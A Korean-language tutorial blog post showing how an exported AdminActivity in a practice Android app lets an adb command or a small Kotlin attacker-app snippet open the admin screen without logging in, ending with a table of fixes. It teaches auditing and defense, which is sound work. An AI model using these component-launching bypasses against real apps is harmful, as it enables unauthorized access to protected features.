---
title: exported 액티비티 하나로 로그인 건너뛰기
description: AndroidManifest의 exported 속성이 왜 앱 해킹의 첫 번째 확인 항목인지, 실습 앱으로 직접 열어 보며 정리했습니다.
category: app
author: seika
tags: [Intent, AndroidManifest, adb]
date: 2026-10-10 10:00:00 +0900
---

안드로이드 앱을 처음 분석할 때 가장 먼저 여는 파일은 AndroidManifest.xml입니다. 앱이 어떤 화면과 서비스를 갖고 있는지, 그중 무엇을 바깥에 열어 두었는지가 여기에 다 적혀 있기 때문입니다.

이 글에서는 실습용으로 만든 `lab.andlab.vulnapp` 앱을 예로, 로그인 뒤에만 보여야 할 관리자 화면을 adb 명령 한 줄로 바로 여는 과정을 따라갑니다.

## exported가 뜻하는 것

액티비티, 서비스, 브로드캐스트 리시버, 콘텐트 프로바이더는 안드로이드 앱을 이루는 네 가지 컴포넌트입니다. 각 컴포넌트에는 `android:exported` 속성이 있고, 이 값이 `true`면 다른 앱이 인텐트로 그 컴포넌트를 직접 부를 수 있습니다.

<figure>
<svg viewBox="0 0 680 260" role="img" aria-label="공격자 앱이 로그인 화면을 거치지 않고 exported 관리자 화면을 직접 여는 흐름">
<style>
.ex-box{fill:var(--bg-2);stroke:var(--line);stroke-width:1.5}
.ex-app{fill:none;stroke:var(--ink-3);stroke-width:1.5;stroke-dasharray:5 5}
.ex-bad{fill:var(--bg-2);stroke:var(--red);stroke-width:1.5}
.ex-t{font:600 14px var(--sans);fill:var(--ink)}
.ex-s{font:500 11.5px var(--mono);fill:var(--ink-3)}
.ex-r{font:500 11.5px var(--mono);fill:var(--red)}
.ex-ok{fill:none;stroke:var(--ink-3);stroke-width:1.5}
.ex-go{fill:none;stroke:var(--red);stroke-width:2}
.ex-h{fill:var(--ink-3)}.ex-hr{fill:var(--red)}
</style>
<rect class="ex-box" x="20" y="95" width="150" height="70" rx="10"/>
<text class="ex-t" x="95" y="126" text-anchor="middle">공격자 앱 / adb</text>
<text class="ex-s" x="95" y="146" text-anchor="middle">am start -n ...</text>
<rect class="ex-app" x="250" y="20" width="410" height="220" rx="14"/>
<text class="ex-s" x="270" y="44">lab.andlab.vulnapp</text>
<rect class="ex-box" x="275" y="62" width="160" height="66" rx="10"/>
<text class="ex-t" x="355" y="92" text-anchor="middle">LoginActivity</text>
<text class="ex-s" x="355" y="112" text-anchor="middle">비밀번호 확인</text>
<rect class="ex-bad" x="480" y="150" width="160" height="70" rx="10"/>
<text class="ex-t" x="560" y="180" text-anchor="middle">AdminActivity</text>
<text class="ex-r" x="560" y="200" text-anchor="middle">exported="true"</text>
<path class="ex-ok" d="M435 95h60q20 0 20 20v28"/><path class="ex-h" d="m509 141 6 9 6-9z"/>
<text class="ex-s" x="455" y="84">로그인 성공 시</text>
<path class="ex-go" d="M170 140q160 0 300 45"/><path class="ex-hr" d="m466 177 14 10-17 3z"/>
<text class="ex-r" x="250" y="178">로그인 없이 바로</text>
</svg>
<figcaption>정상 흐름은 로그인을 거쳐야 하지만, exported 된 화면은 밖에서 바로 열 수 있습니다.</figcaption>
</figure>

예전에는 이 값이 생략되면 기본값이 문제였습니다. 인텐트 필터가 붙은 컴포넌트는 따로 적지 않아도 exported로 취급됐거든요. Android 12(API 31)부터는 인텐트 필터가 있는 컴포넌트에 `android:exported`를 반드시 적어야 빌드가 되도록 바뀌었습니다. 그래도 개발자가 일단 빌드를 통과시키려고 `true`를 적어 두는 경우가 흔합니다.

## 매니페스트에서 찾기

jadx로 APK를 열면 매니페스트를 바로 볼 수 있습니다. 실습 앱의 매니페스트에서 눈에 띄는 부분은 이렇습니다.

```xml
<activity
    android:name=".LoginActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>

<!-- 로그인 뒤에만 들어와야 하는 화면인데 밖으로 열려 있다 -->
<activity
    android:name=".AdminActivity"
    android:exported="true" />
```

런처 화면인 LoginActivity가 exported인 건 당연합니다. 홈 화면에서 앱을 눌러 실행해야 하니까요. 문제는 AdminActivity입니다. 인텐트 필터도 없는데 `exported="true"`가 붙어 있습니다.

컴포넌트가 많은 앱이라면 drozer로 exported 된 것만 골라 보는 편이 빠릅니다.

```console
dz> run app.activity.info -a lab.andlab.vulnapp
Package: lab.andlab.vulnapp
  lab.andlab.vulnapp.LoginActivity
    Permission: null
  lab.andlab.vulnapp.AdminActivity
    Permission: null
```

`Permission: null`은 부르는 쪽에 아무 권한도 요구하지 않는다는 뜻입니다.

## 직접 열어 보기

`am start`에 `-n` 옵션으로 패키지와 클래스 이름을 주면 그 액티비티를 바로 띄웁니다.

```console
$ adb shell am start -n lab.andlab.vulnapp/.AdminActivity
Starting: Intent { cmp=lab.andlab.vulnapp/.AdminActivity }
```

로그인 화면을 한 번도 거치지 않았는데 관리자 화면이 열립니다. adb는 셸 권한으로 실행되지만, exported 컴포넌트는 권한이 하나도 없는 일반 앱에서도 똑같이 열 수 있습니다. 공격자 앱이라면 이렇게 부르면 됩니다.

```kotlin
val intent = Intent().setClassName(
    "lab.andlab.vulnapp",
    "lab.andlab.vulnapp.AdminActivity"
)
startActivity(intent)
```

액티비티가 인텐트 엑스트라를 읽는다면 값도 넣어 볼 수 있습니다. `--es`는 문자열, `--ez`는 불리언, `--ei`는 정수입니다.

```console
$ adb shell am start -n lab.andlab.vulnapp/.AdminActivity --es user admin --ez debug true
```

> 엑스트라 이름은 jadx에서 `getStringExtra`, `getBooleanExtra` 호출을 찾으면 대부분 나옵니다. 화면이 열리기만 하고 내용이 비어 있다면 어떤 엑스트라를 기대하는지부터 확인해 보세요.

## 어떻게 막아야 하나

고치는 방법은 상황에 따라 다릅니다.

| 상황 | 대응 |
| --- | --- |
| 앱 안에서만 쓰는 화면 | `android:exported="false"` |
| 같은 회사 앱끼리만 부르는 화면 | signature 수준 권한을 만들어 `android:permission`에 지정 |
| 꼭 외부에 열어야 하는 화면 | 액티비티 안에서 로그인 상태와 입력값을 다시 검증 |

마지막 항목이 중요합니다. 로그인 화면을 거쳐 왔을 거라는 가정은 화면 흐름에 기대는 것이지 보안 검사가 아닙니다. 민감한 화면은 열릴 때마다 스스로 세션을 확인해야 합니다.

## 정리

exported 컴포넌트 점검은 앱 해킹에서 가장 먼저, 가장 싸게 해 볼 수 있는 확인입니다. 매니페스트를 열고, `exported="true"`인 컴포넌트를 목록으로 뽑고, 하나씩 직접 불러 보는 것까지 10분이면 됩니다. 다음 글에서는 서비스와 브로드캐스트 리시버, 콘텐트 프로바이더를 같은 방식으로 살펴보겠습니다.
